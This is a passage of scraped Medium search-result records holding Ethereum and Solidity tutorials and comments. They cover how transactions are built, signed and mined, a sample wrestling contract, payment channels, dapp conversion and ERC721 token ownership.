voting application is a simple app that uses Hyperledger Fabric Network and Chaincode EVM to compile Web3 and Solidity smart contract deployments.Developers who are more familiar with Ethereum tools and coding can apply their knowledge of Ethereum on the Hyperledger infrastructure.Once you\u2019ve completed this code pattern, you will understand how to use both permissioned (Hyperledger) and permissionless (Ethereum) blockchain frameworks together.You can see the full code pattern on IBM Developer.", "responses": ""}, {"title": "", "author_name": "Andrew Miller", "link": "https://medium.com/@socrates1024/in-my-opinion-this-isnt-any-different-than-reentrancy-at-least-the-way-i-used-it-when-first-53c0308a0289?source=search_post", "post_date": "Sep 7, 2016", "readtime": "", "upvotes": "", "content": "Andrew MillerBlockedUnblockFollowFollowingSep 7, 2016In my opinion, this isn\u2019t any different than \u201creentrancy\u201d, at least the way I used it when first pointing out this problem in 2014.MediumEdit descriptionblog.blockstack.orgWhen I illustrated this with an example, Solidity didn\u2019t exist and Serpent have \u201cfunctions.\u201d But my example was logically broken into different functions indicated with a command byte, and it involved different functions just like you explained. Reentrancy at the *contract* level is essential for the problem involving shared state.", "responses": "1"}, {"title": "Ethereum Smart Contract Support in Bluzelle\u2019s Lovelace\u00a0Release", "author_name": "Bluzelle", "link": "https://blog.bluzelle.com/ethereum-smart-contract-support-in-bluzelles-lovelace-release-f8ff22a2b906?source=search_post", "post_date": "Aug 13, 2018", "readtime": "2 min read", "upvotes": "", "content": "Ethereum Smart Contract Support in Bluzelle\u2019s Lovelace\u00a0ReleaseBluzelleBlockedUnblockFollowFollowingAug 13, 2018With Ethereum Solidity smart contracts, the key idea is to write a smart contract that employs the Bluzelle libraries to make CRUD requests. These requests get routed through Oracalize through to the swarm and then responses are sent back through Oracalize to your smart contract. It is important then to implement a listener to process the responses. This asynchronous request-response pattern is how your Ethereum dApp should be structured.In your dApp, make sure you are importing the bluzelle.sol file from:https://github.com/bluzelle/bluzelle-sol/blob/master/contracts/BluzelleClient.solPlease note that BluzelleClient smart contract can always be modified if the user wishes to have a more robust or more secured dapp.The BluzelleClient contains all the expected CRUD operations that are needed to talk to a Bluzelle swarm. One simply imports this utility smart contract, and calls any of the four functions: read(string key), remove(string key), set(string key, string data), update(string key, string data) and create(string key, string data).The file SampleDapp.sol:https://github.com/bluzelle/bluzelle-sol/blob/master/contracts/SampleDapp.solshowcases how to use these four functions to communicate data with the bluzelle swarm:/* Read the value from Bluzelle (this requires a small fee to pay Oracalize) */Function getValue(string _key) onlyOwner public payable{     read(_key);}", "responses": ""}, {"title": "", "author_name": "Dave Kajpust", "link": "https://medium.com/@davekaj/maybe-my-first-comment-wasnt-totally-clear-4041d30c8797?source=search_post", "post_date": "Nov 5, 2018", "readtime": "", "upvotes": "", "content": "Dave KajpustBlockedUnblockFollowFollowingNov 5, 2018Maybe my first comment wasn\u2019t totally clear! The web development expereience won\u2019t help with the three core computer science things I mentioned.It is just that you will more easily get hired if you know web dev and solidity, rather than trying to teach yourself cryptography or distributed computing or mechanism design is going to take longer, because you have to learn how to design these and people rely on them to be rightCoding, is about implementing. Meaning someone else is designing the mechanism, or choosing cryptography to use in the blockchain, and the coder just needs to write the code. It is easier because you can iterate, get help, and test that it is correct.2. A dapp is essentially a normal front end, often built with react and truffle, and the backend is the blockchain. Sometimes dapps have their own indexed backends, but it is only for performance and not necessart3. Business model for dapps isn\u2019t figured out. Almost no dapps are making money. A lot a burning though capital. But, one day, financial dapps will be very big. It is just far away and not too clear how we will get there.", "responses": "1"}, {"title": "", "author_name": "Gustavo (Gus) Guimaraes", "link": "https://medium.com/@gus_tavo_guim/passing-the-address-of-the-token-and-changing-ownership-are-two-different-things-2407a31d04f?source=search_post", "post_date": "Mar 14, 2018", "readtime": "", "upvotes": "7", "content": "Gustavo (Gus) GuimaraesBlockedUnblockFollowFollowingMar 14, 2018Passing the address of the token and changing ownership are two different things.In MintableToken (https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/token/ERC20/MintableToken.sol) only allows contract owner to create tokens. Therefore we need to transfer ownership of the token contract to the crowdsale contract. Otherwise it won\u2019t work and when sending transaction to the crowsale contract it will throw an exception.", "responses": "1"}, {"title": "GoNetwork Tutorial\u200a\u2014\u200aWelcome to the first of a series of technical blog posts from GoNetwork.", "author_name": "GoNetwork", "link": "https://keepingstock.net/pocket-tutorial-welcome-to-the-first-of-a-series-of-technical-blog-posts-from-gonetwork-58476c287c91?source=search_post", "post_date": "Oct 20, 2017", "readtime": "6 min read", "upvotes": "1.1K", "content": "GoNetwork Tutorial\u200a\u2014\u200aWelcome to the first of a series of technical blog posts from GoNetwork.GoNetworkBlockedUnblockFollowFollowingOct 20, 2017GoNetwork with other winners and founders at EthWaterlooFirst a little background on how we got here.ETHWaterloo represented the largest global Ethereum hackathon with participants coming from 32 countries. The 32 hour hack was judged by such notable names in the blockchain community including; Vitalik Buterin, Jeff Coleman, Brian Bondy, Joseph Lubin, Dmitry Buterin to name a few. Our submission Pocket won! We managed to produce a mobile-first bluetooth based tap and pay system using the Ethereum blockchain. We were the only native mobile product amongst the 400 participants.Pocket by GoNetwork, named after pocket change, aims to solve a problem with financial literacy by implementing gamification, parental controls and transparency for youth leveraging the Ethereum blockchain. The offering allows parents to create assignable digital debit cards and claimable rewards for good behaviour such as decreased spending month to month and controlled spending across different categories (food,entertainment, etc.).You can check out our entry at: https://devpost.com/software/pocket-t1fmg5.Our belief is in order for blockchain to reach consumer markets, mobile developers need to start adopting the technology. The goal of this and proceeding tutorials draws on our experience and should get mobile devs to a point of prototyping. As GoNetwork grows we will continue to contribute tools and tutorials to the developer community.This tutorial is based on a hackathon entry i.e. no code audits; as such this is not production quality code. That being said, lets get started.", "responses": "20"}, {"title": "Life Cycle of an Ethereum Transaction", "author_name": "Mahesh Murthy", "link": "https://medium.com/blockchannel/life-cycle-of-an-ethereum-transaction-e5c66bae0f6e?source=search_post", "post_date": "Dec 26, 2017", "readtime": "9 min read", "upvotes": "3.7K", "content": "Life Cycle of an Ethereum TransactionLearn How an Ethereum Transaction is Created and Propagated to the\u00a0NetworkMahesh MurthyBlockedUnblockFollowFollowingDec 26, 2017Transactions are at the heart of the Ethereum blockchain (or any blockchain for that matter). When you interact with the Ethereum blockchain, you are executing transactions and updating it\u2019s state. Have you ever wondered what exactly happens when you execute a transaction in Ethereum? Let\u2019s try to understand it by looking at an example transaction. In this post, we will cover the following.An end to end traversal of an Ethereum transaction starting from your browser/console to the Ethereum network and back to your browser/consoleUnderstand how transactions work when you use a plugin such as Metamask or Myetherwallet instead of running your own nodeWhat to do if you are too paranoid and don\u2019t trust any plugins to execute your transaction?This post assumes that you have a basic understanding of Ethereum and it\u2019s components such as accounts, gas and contracts. Here is a good explanation of these concepts. If you are a developer new to Ethereum, you might find this helpful. You can also learn to build a simple dapp here. This post will make more sense if you have executed few transactions yourself. An example of a transaction is you sending some ether to another person or a contract. Another example is if you have interacted with a dapp. For example, if you go here and buy some tokens, that would be a transaction. If you vote for a candidate, that would be another transaction.1. End to end overview of an Ethereum transactionLet\u2019s take the following contract call as an example and traverse through the entire flow of how this function call/transaction gets executed and gets permanently stored on the blockchain. You can find the entire contract here. At a high level, it\u2019s a voting contract where you initialize a few candidates contesting in an election and anyone can vote for them. The votes will be recorded on the blockchain.Voting.deployed().then(function(instance) {  instance.voteForCandidate('Nick', {gas: 140000, from: web3.eth.accounts[0]}).then(function(r) {    console.log(\"Voted successfully!\")  })})We assume that you have an Ethereum client (Geth or Parity) running locally on your computer which is connected to one of the networks (Testnet or Mainnet) and you have access to the contract address and ABI to execute the transaction.If you have built a dapp, the above code should look familiar. There is a contract called Voting which has already been deployed on to the blockchain. We instantiate that contract and execute a method called voteForCandidate and pass in the candidate name, gas limit for this transaction and the account that executes this transaction. As the name indicates, this function is used to vote for a candidate and the vote is recorded on the blockchain. Below we will try to deconstruct this call and understand everything that happens when you execute this javascript function.1. Construct the raw transaction objectThe voteForCandidate function call is first converted in to a raw transaction (rawTxn) as shown below. Web3js library is used to build the raw transaction object.txnCount = web3.eth.getTransactionCount(web3.eth.accounts[0])var rawTxn = {    nonce: web3.toHex(txnCount),    gasPrice: web3.toHex(100000000000),    gasLimit: web3.toHex(140000),    to: '0x633296baebc20f33ac2e1c1b105d7cd1f6a0718b',    value: web3.toHex(0),    data: '0xcc9ab24952616d6100000000000000000000000000000000000000000000000000000000'};Let\u2019s try to understand all the fields in the raw transaction object and how they are set.nonce: Each Ethereum account has a field called nonce to keep track of the total number of transactions that account has executed. Nonce is incremented for every new transaction and this allows the network to know the order in which the transactions need to be executed. Nonce is also used for the replay protection.gasPrice: Price per unit of gas you are willing to pay for this transaction. If you are executing your transaction on the Mainnet, here is a handy website from ETH Gas Station that recommends what you should set the gas price for your transaction to succeed in a reasonable amount of time. Gas prices are current measured in GWei and range from 0.1->100+Gwei. You will learn more about gas price and it\u2019s impact later in this article.gasLimit: Maximum gas you are willing to pay for this transaction. This value insures that in case of an issue executing your transaction (like infinite loop), you account is not drained of all the funds. Once the transaction is executed, any remaining gas is sent back to your account.to: The address to which you are directing this function call. This is the contract address (0x633296baebc20f33ac2e1c1b105d7cd1f6a0718b) of the Voting contract in our case.value: Total Ether you want to send. When we executevoteForCandidate, we are not sending any Ether and so the value is 0. If you were executing a transaction to send Ether to another person or a contract, you would set this value.data: Let\u2019s see how this data field is calculated.You first take the function signature from the ABI voteForCandidate(bytes32)and generate the hash of it.> web3.sha3('voteForCandidate(bytes32)')'0xcc9ab267dda32b80892b2ae9e21b782dbf5562ef3e8919fc17cab72aa7db9d59'You take the first 4 bytes of that hash. So, that would be: 0xcc9ab267.You then take the argument \u2018Nick\u2019 and convert to bytes32 and you get 52616d6100000000000000000000000000000000000000000000000000000000You combine the two to get the data payload.2. Sign the TransactionIf you remember, you used web3.eth.accounts[0] to execute the transaction. The Ethereum network needs to know that you actually own that account to make sure someone else doesn\u2019t execute this transaction on your behalf. The way to prove this to the network is by signing the transaction using the private key corresponding to that account. The signed transaction looks like this:const privateKey = Buffer.from('e331b6d69882b4ab4ea581s88e0b6s4039a3de5967d88dfdcffdd2270c0fd109', 'hex')const txn = new EthereumTx(rawTxn)txn.sign(privateKey)const serializedTxn = txn.serialize()3. Transaction is validated locallyThe signed transaction is submitted to your local Ethereum node. You local node will then validate the signed transaction to make sure that it was really signed by this account address.4. Transaction is broadcast to the\u00a0networkThe signed transaction is broadcast by your geth/parity node to it\u2019s peers who in turn broadcast to their peers and so on. Once the transaction is broadcast to the network, your local node also outputs the transaction id which you can use to track the status of your transaction. This transaction id is just the hash of the signed transaction object.transactionId = sha3(serializedTxn)If you execute the transaction on a public Ethereum network, the best way to track the status of your transaction is on etherscan.io. In the picture above, if you notice there are a couple of nodes marked as Etherscan nodes. The folks at Etherscan run a few nodes and they have a nice frontend webapp connected to it. When your transaction is picked up by their nodes, you can see your pending transaction on their website.One other thing to remember is, not all nodes will accept your transaction. Some of these nodes might have a setting to accept only transactions with certain minimum gas price. If you have set a gas price lower than that limit, that node will just ignore your transaction.5. Miner Node accepts the transactionAs you can see in the picture, the Ethereum network has a mix of miner nodes and the non miner nodes. As you probably know, the miners are the ones who do the job of including your transaction in the block. Miners maintain a transaction pool where your transaction gets added to before they start evaluating it.If you notice the picture above, the miners store all the transactions in the pool sorted by gas price. The higher the gas price, the more likely the transaction is included in the next block. This is the common configuration for a miner node (to optimize for higher pay). However, a miner can configure her node to sort the transactions however they like (say they want to help the network by mining only low gas transactions).In the picture above, you see how our voteForCandidate transaction is at the bottom of the miner\u2019s pool? Once all the high gas fee transactions have been mined and included in the block, the miners will work our transaction.One other thing to note is, the miner\u2019s pool can hold a finite number of transactions. Let\u2019s say there is a hot ICO sale going on or a really popular dapp (like Crypto Kitties) takes off\u00a0. People submit their transactions with high gas price hoping that the miners pick up their transaction before any other transactions. If higher gas price transactions fill up the pool, your low price transaction is discarded. There is no hope for our candidate Nick to receive any vote for a while. We might even have to rebroadcast the transaction in such cases.Another trick to bump your transaction up the pool is to resubmit your transaction with a higher gas price but using the same nonce value. That way, when the new transaction is received by the miners, the new higher gas price transaction overwrites your old transaction. If the nonce value is different, it is considered a different transaction (You will end up casting 2 votes to Nick). Here is an excellent article from Jim McDonald explaining this topic in depth.6. Miner Node finds a valid block and broadcasts to the\u00a0networkThe miner eventually picks our transaction to include in the block along with other transactions. The miner can only pick so many transactions to include in the block because Ethereum has set a block gas limit. i.e, the sum of all the gas limits on the transactions can not exceed the block gas limit. You can see the current gas limit at ethstats.net.Once the miners select the transactions to include in the block, the transactions are validated and included in a pending block and the Proof of Work begins. One of the miner nodes eventually finds a valid block (by solving the PoW puzzle) and adds that block to the blockchain. Just like the raw transaction was broadcast by your local node which was received by all other nodes, the miner node broadcasts this valid block to other nodes.7. Local Node receives/syncs the new\u00a0blockEventually your local node will receive this new block and syncs it\u2019s local copy of the blockchain. Upon receiving the new block, the local node executes all the transactions in the block.If you use truffle to execute your transaction, truffle constantly polls the blockchain for confirmation. Once it sees the transaction is confirmed, it executes the code inside the then() block and prints the console log (per our example).2. Using Metamask instead of the local\u00a0nodeIf you install the MetaMask browser plugin, you can manage your accounts in your browser. The keys are stored only on your browser, so you are the only one who has access to your account and the private key. When you execute a transaction in your browser, the plugin takes care of converting your function call in to a raw transaction and sign the transaction using your private key. Metamask runs their own nodes which they use to broadcast your transaction (Behind the scenes Metamask uses nodes hosted by Infura). This way, you don\u2019t even have to run your own Ethereum node.3. Offline\u00a0signingWhat if you are not comfortable using a plugin or if you are worried that your local geth node might be compromised? There is a secure solution to solve that issue.If you notice, the first 2 steps don\u2019t require you to be online at all. If you want to absolutely make sure your transaction isn\u2019t tampered with, you can use a computer which is offline to convert the function call in to a raw transaction and use your private key to sign the transaction. You can then copy the signed transaction string and use a computer that is online to broadcast it to the network. There are many services like Etherscan and Infura you can use to broadcast your signed transaction to the network.Another safe solution is to use a hardware wallet such as Ledger or Trezor. These wallets store your private key and the code to sign the transaction is programmed in to the hardware itself. They need to be connected to the internet only to publish your signed transaction.Hopefully this gave you a better idea of how Ethereum transactions work. If you find something incorrect in the post, please leave a comment and I will fix it.Thanks Jim McDonald for proofreading this article.Self promotion: If you are interested in learning to build Ethereum dapps, check out my site zastrin.com!", "responses": "39"}, {"title": "Ethereum Development Walkthrough (Part 1: Smart contracts)", "author_name": "dev_zl", "link": "https://hackernoon.com/ethereum-development-walkthrough-part-1-smart-contracts-b3979e6e573e?source=search_post", "post_date": "Jan 14, 2018", "readtime": "8 min read", "upvotes": "2K", "content": "Ethereum Development Walkthrough (Part 1: Smart contracts)dev_zlBlockedUnblockFollowFollowingJan 14, 2018Smart contracts, ICOs, Mist, Metamask, Remix, geth, web3.. You\u2019ve probably seen it all if you spent a little time trying to get into the world of Ethereum developement.Some deploy smart contracts to a test network, others tell you to read a yellow paper, while others advise you to use the truffle suite because it\u2019s great. And you are there, not knowing what exactly to do and how everything works together.If this is the first article that you read on Ethereum or the blockchain eco-system in general, you are going to love it! Experts calling each others names on twitter, unsafe standards and protocols, untested and buggy development tools. Not everything is figured out yet, everyone is going in different directions, and there still a lot to be done. The future of institutions, banks, and governments is being decided by mad developers! It\u2019s so great.Anyway, don\u2019t worry anymore, I\u2019ll try to connect all the dots for you in this tutorial series, and walk you through the universe of Smart contracts and dapps developement, and show you how everything fits together.While I will not get into every detail, I\u2019ll link some materials that will help you understand some concepts better, and it\u2019s up to you to research them and get into all the little details. The goal of this series is to help you understand better how things work together, in the simplest way possible, like a friend would explain it to you.I don\u2019t even know what Ethereum\u00a0isThe official website of Ethereum tells us this:Ethereum is a decentralized platform that runs smart contracts: applications that run exactly as programmed without any possibility of downtime, censorship, fraud or third-party interference.In other words, it uses the capabilities that gives us the blockchain technology to certify the execution of the code that we run.If you don\u2019t know what the blockchain, Ethereum, Bitcoin, cryptocurrency or any of these words mean, I advise you to listen to this excellent podcast by Tim Ferriss, interviewing Nick Szabo and Naval Ravikant: The Quiet Master of Cryptocurrency\u200a\u2014\u200aNick SzaboWhat are Smart Contracts?On Ethereum, Smart Contracts are scripts that can handle money. It\u2019s as simple as that.These contracts are enforced and certified by parties that we call miners. Miners are multiple computers who add a transaction (Execution of a smart contract, payment of a cryptocurrency etc.) to a public ledger that we call a block. Multiple blocks constitute a blockchain.We pay these miners with something called Gas, which is the cost to run a contract. When you publish a smart contract, or execute a function of a smart contract, or transfer money to another account, you pay some ether that gets converted into gas.If it\u2019s still unclear, or you want to know more details, here are some interesting links:A different introduction to Smart Contracts in video.Smart contracts page on Wikipedia.A more detailed explanation of Gas.Before diving into smart contracts developmentIn this tutorial, I\u2019ll assume that you already have some basis in software development, and have a basic knowledge of Javascript and Node.JS. Otherwise, you\u2019ll be quickly lost. Solidity, the programming language that we will use to develop, is close to Javascript\u2019s syntax, and since a lot of development tools around Ethereum are based on Javascript and NodeJS, it will be easier for you to get in if you are already comfortable with both. This is not a tutorial for beginners, and while I\u2019ll link some alternative tutorials for you if you didn\u2019t understand some concepts, it\u2019s up to you to research the rest.Smart contracts developmentNow, finally, we start the interesting part, as I said Solidity is close to Javascript, but they are not alike. On Solidity, and I\u2019m sorry to tell you that, frontend developer, you just can\u2019t slap JQuery on a piece of code and hope that it will work, you can\u2019t overlook security, and you just can\u2019t hack your way through. We will see why when we will discuss security, development patterns, and fail-proofing our code.Now, for our first example, I\u2019m thinking about a script inspired by the movie In Time, where, in a dystopian future, people trade their remaining time to live like money. In the movie, they have a variant of arm wrestling that involves playing with that time, and we will do just that! Wrestling money using a Smart Contract.And don\u2019t worry, I\u2019ll make available for you all the scripts we will see on Github.Also, if it\u2019s the first time you deal with smart contracts, it\u2019s fine if you don\u2019t understand everything now, it takes practice, reading the docs, and a bit of research to get accustomed to Solidity.The codeNow, onto the coding, first of all, the base of a Solidity script is the following snippet, the pragma directive to tell the compiler which version of Solidity we are using, and the name of our contract, a similar structure to a class in Javascript. Here it\u2019s \u201cWrestling\u201d.We want two wrestlers, so we will add two variables that hold the address of their accounts (Public keys of their wallets).In our little game, in each round, the wrestlers will be able to put in a sum of money, and if one put in double the money of the other(in total), he will win.One important thing about the public/private keywords is, even though, a variable is private, it doesn\u2019t mean that someone couldn\u2019t read its content, it just means that it can be accessed only inside the contract, but in reality, since the whole blockchain is stored on a lot of computers, the information that is stored inside the variable could always be seen by others, and that represents the first security consideration that you should keep in mind.On the other hand, the compiler automatically creates getter functions for public variables. To make it possible for other contracts or users to change the value of the public variable, you need to create a setter function.Now we will add three events, for every step of our game. The beginning, when the wrestlers register, during the game, for each round, and at the end, when a wrestler wins. Events are simply logs, and they can be used to call JavaScript callbacks in the user interface of distributed applications, also known as dapps. Events can even be used for debugging purposes during development since there is no equivalent to the \u201cconsole.log()\u201d function of JavaScript on Solidity.Now we will add the constructor, in Solidity, it has the same name as our contract and it will be called only once, upon the creation of the contract.Here, the first wrestler will be the one who created the contract. \u201cmsg.sender\u201d is the address of the one who invoked the function.Next we let another wrestler register with the following function:The require function is a special error-handling function within Solidity that will revert changes if a condition is not met. In our example, if the variable wrestler2 equals the 0x0 address (the equivalent of 0 for addresses), we can proceed, if the address wrestler2 is different from the 0x0 address, it means that a player has already registered as an opponent, and therefore, we will refuse new registrations.Again, \u201cmsg.sender\u201d is the address of the account that called the function, and we emit an event that signals the start of the wrestling.Now, every wrestler will call a function, \u201cwrestle()\u201d, putting in money. And if both have played, we see if one of them has won (our rule was that one of them have to put in double the cash of the other one). The \u201cpayable\u201d keyword means that the function can receive money, if it isn\u2019t set, the function will not accept ether. The \u201cmsg.value\u201d is the amount of ether that was sent to the contract.We then add the endOfGame(), and endOfRound() functions. The \u201cinternal\u201d keyword is the same as private, the only difference is that internal functions could be inherited by other contracts(since Solidity is similar to other object-oriented languages), while private functions cannot be inherited.Notice that we don\u2019t deliver the money to the winner directly, while in this case it\u2019s not that important, since the winner will take all the money off this contract, in other cases, when multiple users can withdraw ether off a contract, it\u2019s more secure to use a withdraw pattern, to avoid re-entrancy.It simply means, that if for example multiple users can withdraw money off a contract, one can simply call the withdraw function multiple times at once and get payed multiple times. So we need to write our withdraw function in such a manner that it will nullify the amount he should receive before proceeding to pay him.It looks like this:And that\u2019s it. You can find the whole snippet at the following link:devzl/ethereum-walkthrough-1ethereum-walkthrough-1 - Repository for the first part of the tutorial series on Ethereum, \"Ethereum development\u2026github.comUsing an\u00a0IDECopy the snippet now, and open the Remix IDE in a new tab of your browser:You can use Remix directly on your browser, and it has a lot interesting functionalities that you could hardly find elsewhere at the moment.Click on the button \u201c+\u201d on the top left of the page and create a new file named \u201cWrestling.sol\u201d, then past the code that you can find in the github repo linked above:Finally some syntax highlighting. Github doesn\u2019t support Solidity\u00a0.sol extension yet.On the right part of the page, you can find multiple interesting tabs such as the \u201cAnalysis\u201d one, that will show errors and recommendations. I leave you to discover this tool more. I wanted to show it to you, even though we will use other tools in the next part, the goal of this tutorial series, as I said before, is to connect the dots for you, and show you how things fit together, and it\u2019s up to you to decide whether or not you are at ease using an IDE on a browser. Invite you to read the docs of Remix if you do.Alternatively, you should start getting familiar with solidity by reading its docs.In the next part, we will see how to deploy the Smart Contract to two kinds of test networks, discover truffle, ganache, and geth, and how they can all fit together.If you liked this first part, you can find me on twitter @dev_zl.Part two can be found here.", "responses": "12"}, {"title": "Ethereum Payment Channel in 50 Lines of\u00a0Code", "author_name": "Matthew Di Ferrante", "link": "https://medium.com/@matthewdif/ethereum-payment-channel-in-50-lines-of-code-a94fad2704bc?source=search_post", "post_date": "Jun 5, 2017", "readtime": "4 min read", "upvotes": "1.3K", "content": "Ethereum Payment Channel in 50 Lines of\u00a0CodeMatthew Di FerranteBlockedUnblockFollowFollowingJun 5, 2017With the talk of state/payment channels being a \u201cfuture\u201d scalability option in Ethereum, I wanted to write a contract to show that they\u2019re more than doable now. You don\u2019t need to wait for Raiden, you can set up your own trustless channels right now.I\u2019ll walk through the solidity code in channel.sol here: https://github.com/mattdf/payment-channelLet\u2019s say Alice and Bob want to set up a payment channel for something that requires micropayments that they don\u2019t want to commit on chain to save on transaction fees. In this case, Bob may be paying Alice to manage a social media presence, and he pays her 0.001 ETH per tweet(24 cents)\u200a\u2014\u200aif Bob were to make an on-chain transaction for each tweet, 20% of Alice\u2019s income would be eaten up by fees.On one hand, Alice does not want to do 100 tweets of work and trust Bob will pay her at the end for all 100 tweets, and on the other hand, Bob doesn\u2019t want to pay Alice for 100 tweets all at once for her to just disappear and not do any work.We can solve this with a payment channel where Bob commits 100*0.001 = 0.1 ETH to the channel smart contract, where the money can only either go to Alice or back to Bob. We see the constructor here:Bob sends 0.1 ETH when creating the contract, and sets a timeout of 1 day, assuming the work will be done by then, or he can cancel the payment channel and return the funds to himself.Alice now sees that through the payment channel the funds are locked and begins tweeting. For each tweet, Bob signs a hash of (contract_address, value) with the private key he used to set up the channel, and sends it to Alice. So for the first tweet Bob signs (0x123\u2026, 0.001 ETH), for the second (0x123, 0.002 ETH), etc\u2026Each time Alice receives this, she also signs it but she does not send it to the blockchain. At any moment if Alice decides she has received enough and no longer needs to tweet, she can submit the multi-signed (by both Bob and Alice) message to the smart contract and the smart contract will send the agreed upon value to Alice (say, 0.05 ETH) and send the rest back to Bob.The function Alice can call to terminate the channel. Seeing as it requires both signatures, Bob cannot single-handedly close it and cheat Alice out of work she\u2019s already\u00a0done.Because the function requires both signatures to successfully execute, neither Bob or Alice can run it without submitting a value they both signed (and hence agreed to).If Alice is malicious and wants to extort Bob once he\u2019s locked his funds, by not doing any work and saying she\u2019ll only sign a tx that sends her half the money\u200a\u2014\u200athe timeout protects Bob in this scenario. He can simply wait for the day to end and he can call ChannelTimeout, which destroys the contracts and returns all funds back to him.Timeout function to protect Bob from being\u00a0extortedAlso, because Bob never has Alice\u2019s signatures until they\u2019re submitted to the blockchain, he cannot close the channel in a way that cheats Alice out of money. If Alice sees Bob stops paying her, she can simply close the channel, receive her funds, and be done with it. This way, at most, Alice is only at risk of not being paid for 1 tweet\u200a\u2014\u200aor losing out 24 cents. Neither party is at risk of more than 24 cents of loss, compared to 20 dollars in the non-payment channel example. They also both massively save in tx fees!That\u2019s it! This contract is enough for a payment channel between two individuals. Raiden and more complex setups enable multi-party channels that can be linked together, but you don\u2019t need to wait for that if you just want to use the simplest case now. Ethereum is already scalable with payment channels far more than Bitcoin, because it does not have tx malleability problems.", "responses": "24"}, {"title": "A Gentle Introduction to Ethereum Programming, Part\u00a01", "author_name": "Facu Spagnuolo", "link": "https://blog.zeppelin.solutions/a-gentle-introduction-to-ethereum-programming-part-1-783cc7796094?source=search_post", "post_date": "Nov 14, 2017", "readtime": "6 min read", "upvotes": "1.6K", "content": "A Gentle Introduction to Ethereum Programming, Part\u00a01Facu SpagnuoloBlockedUnblockFollowFollowingNov 14, 2017Two months ago I was asked to build an Ethereum web application as a work test to join Zeppelin, but I didn\u2019t have any idea about blockchain technology at all. I had barely heard of Bitcoin, so there was no other option but to dive in.This will be a series of posts aimed at software developers who want to ramp up to Ethereum. Please keep in mind that I do not consider myself an expert in this subject, I\u2019d just like to teach you what I learned and save you some time if you are in the same place I was. By the end of the series you should be able to build a fully-fledged smart-contract-enabled web application (also known as DApp) on your own!Enjoy, and please do not hesitate to reach out with questions, suggestions or feedback.Index1. Taking the first steps1.1. Introduction1.2. Web32. Interacting with a contract3. Frameworks & Tools in the real world4. A real DApp, a token marketplace\u200a\u2014\u200acoming soon", "responses": "13"}, {"title": "Ultimate Guide to Convert a Web App To a Decentralized App\u00a0Dapp", "author_name": "Merunas Grincalaitis", "link": "https://medium.com/ethereum-developers/ultimate-guide-to-convert-a-web-app-to-a-decentralized-app-dapp-f6112a079509?source=search_post", "post_date": "Mar 15, 2018", "readtime": "15 min read", "upvotes": "4.2K", "content": "Ultimate Guide to Convert a Web App To a Decentralized App\u00a0DappMerunas GrincalaitisBlockedUnblockFollowFollowingMar 15, 2018In this guide you\u2019ll learn all you need to take a web app that you already have and convert it into a dapp. I\u2019ll walk you through all the steps from start to finish. At the end of it, you\u2019ll know how to create your own decentralized application based on your web apps in any situation.So be sure to read the entire article and clap it 42 times to help me create more valuable content.I\u2019m writing this guide because I ran a survey of about 100 responses where one of the most demanded topics was how to convert a web app to a dapp. If you\u2019re a web developer, you\u2019ll love this guide even though you\u2019ll have to research about Solidity programming for your own needs later on.This tutorial is ideal for people who have some experience developing Smart Contracts but don\u2019t know how to actually apply their knowledge to create something useful with a dapp. We\u2019ll start from scratch so anybody can use this guide.You must have a web app already created since I\u2019ll show you a web app and we will convert it but we won\u2019t create the web app from scratch.Your goal with this guide is to read and understand the process behind the conversion of a web app to a dapp. Then it\u2019s your choice to apply this information into your own projects.In order to show you how it is done, I\u2019ll create a simple web app project based on the popular social media site Linkedin with less features. Then, you\u2019ll see how to make it decentralized.Here\u2019s the index of the contents in this guide:Preparation. Tools needed for the jobIntroduction. The web app that we are going to convertSmart Contracts. Creating the Smart Contracts required for the dappWeb3. Connecting the Smart Contracts to the web appConclusion", "responses": "20"}, {"title": "Walking Through the ERC721 Full Implementation", "author_name": "Karen Scarbrough", "link": "https://medium.com/blockchannel/walking-through-the-erc721-full-implementation-72ad72735f3c?source=search_post", "post_date": "Mar 28, 2018", "readtime": "17 min read", "upvotes": "2.2K", "content": "Walking Through the ERC721 Full ImplementationA Deep Dive into Managing ERC721\u00a0AssetsKaren ScarbroughBlockedUnblockFollowFollowingMar 28, 2018TL;DRBasically, since ownership of ERC721\u2019s is based on the ownership of a unique index or id, the fundamentals of token creation and transfer need to be extrapolated to accommodate that case. Also, the latest full implementation includes a safeTransferFrom() function that checks for implementation of a standard interface prior to transferring tokens.ERC721 TokensI have seen a lot of material around the interest in ERC721\u2019s as non-fungible tokens that can hold metadata, but the depth of the material that I have found has left me looking for more details. My interest in ERC721\u2019s started back at EthDenver back in February\u200a\u2014\u200ayou can read about about our project using ERC721\u2019s here. I have since followed updates on the implementation of the ERC721 standard because I see a lot more value arising out of this design. As a full implementation of ERC721 rolled out from Open Zeppelin this week, I wanted to write up a resource for developers interested in creating their own ERC721 tokens. It took me a while to wrap my head around it, so hopefully, this can help get you there faster if you haven\u2019t look at the ERC721 EIP yet. I tried to balance elements of Solidity and ERC20\u2019s while introducing ERC721\u2019s here. Side note, there is an awesome new site that consolidates all merged EIPs that I highly recommend checking out.To me, token standards can be summarized and compared in the following ways:Ownership\u200a\u2014\u200aHow is token ownership handled?Creation\u200a\u2014\u200aHow are tokens created?Transfer & Allowance\u200a\u2014\u200aHow are tokens transferred, and how do we allow other addresses (contracts or externally owned accounts) transfer capability?Burn\u200a\u2014\u200aHow do we burn or destroy a token?Understanding how these operations work helps to put a complete picture of how a token standard works. The below follows the OpenZeppelin ERC721Token.sol full implementation and amalgamates some additional knowledge of Solidity and other EIPs. As a first stab at documentation, I\u2019m sure this will continue to evolve, and I will try to keep it updated. Any recommendations appreciated.Token OwnershipAs the the most popular token standard to date, ERC20\u2019s have become a standard of comparison for new token proposals. They are fairly easy to understand, at least now that I look back anyways. In terms of ownership, what ERC20\u2019s come down to is a mapping the balances of tokens to their respective owners\u2019 addresses:mapping(address => uint256) balancesIf you have purchased an ERC20 token, your ultimate ownership of that token is verified through the contract in which you bought it as the contract maintains a record of how many tokens (uint256) each address (address) holds. If we want to transfer our ERC20 tokens, then our balance is verified through the balances mapping so that we do not try to send more than we own. A question that may come to mind is, if I have never interacted with a particular token contract, how does it know my balance is zero? The above balances mapping initially defaults to zero, so even if you have never touched a particular token contract before, if you want to check your balance of that token, your balance will be appropriately verified as zero.We have heard over and over again how ERC721\u2019s are non-fungible, which again, for the millionth time means that tokens of the same class or contract can hold a different value. A value of one ERC721 Cryptokittie does not equal the value of another ERC721 Cryptokittie because they are each unique. In order for this to be true, we can no longer simply map an address to a balance. We have to know each unique token that we own.For this reason, in the ERC721 standard, ownership is determined by an array of token indexes or ids that is mapped 